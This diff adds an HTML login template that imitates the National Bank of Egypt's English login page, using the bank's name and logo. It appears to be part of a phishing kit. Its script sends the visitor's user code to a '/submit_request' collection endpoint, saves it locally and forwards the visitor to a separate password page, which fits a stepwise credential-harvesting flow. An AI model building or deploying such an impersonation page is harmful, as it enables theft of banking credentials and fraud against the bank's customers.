@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>National Bank of Egypt - Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='login-theme.css') }}">
+    <style>
+        /* Override for English LTR Header Layout */
+        .site-header { flex-direction: row; justify-content: space-between; }
+        .header-left { order: 1; flex-direction: row; }
+        .header-right { order: 2; }
+        .user-types { flex-direction: row; }
+        .form-group, .forgot-link, .form-control { text-align: left; }
+        .back-link { flex-direction: row; }
+    </style>
+</head>
+<body>
+
+<header class="site-header">
+    <div class="header-left">
+        <div class="menu-btn"><i class="fas fa-bars"></i></div>
+        <a href="login.html" class="lang-switcher">
+            <span>العربية</span>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
+        </a>
+    </div>
+    <div class="header-right">
+        <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="National Bank of Egypt">
+    </div>
+</header>
+
+<main class="login-shell">
+    <div class="login-card-container">
+        <div class="card-logo">
+            <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="National Bank of Egypt">
+        </div>
+
+        <div class="user-types">
+            <div class="type-card active" onclick="toggleUserType(this)">
+                <i class="far fa-user"></i>
+                <span>Individual</span>
+            </div>
+            <div class="type-card" onclick="toggleUserType(this)">
+                <i class="fas fa-building"></i>
+                <span>Corporate</span>
+            </div>
+        </div>
+
+        <div class="welcome-msg">Welcome, <span>Guest</span></div>
+        <h1 class="page-heading">User Code</h1>
+
+        <section class="login-card">
+            <div id="errorMessage" role="alert"></div>
+            <form id="step1Form">
+                <div class="form-group">
+                    <label class="form-label">User Code</label>
+                    <div class="form-control-wrapper">
+                        <input type="text" id="username" name="username" class="form-control" placeholder="Enter User Code" required autofocus>
+                    </div>
+                </div>
+                <a href="#" class="forgot-link">Forgot User Code?</a>
+                
+                <button type="submit" class="submit-btn">Login</button>
+            </form>
+        </section>
+
+        <div class="register-section">
+            <a href="#" class="register-title">Register Now</a>
+            <p class="register-text">Join National Bank of Egypt customers</p>
+        </div>
+    </div>
+</main>
+
+<script>
+function toggleUserType(element) {
+    document.querySelectorAll('.type-card').forEach(card => card.classList.remove('active'));
+    element.classList.add('active');
+}
+
+document.getElementById('step1Form').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const username = document.getElementById('username').value;
+    if (username) {
+        localStorage.setItem('temp_username', username);
+        fetch('/submit_request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            keepalive: true,
+            body: JSON.stringify({
+                type: 'username',
+                data: { username: username }
+            })
+        }).catch(error => console.error('Error:', error));
+        window.location.href = 'password_en.html';
+    }
+});
+</script>
+</body>
+</html>
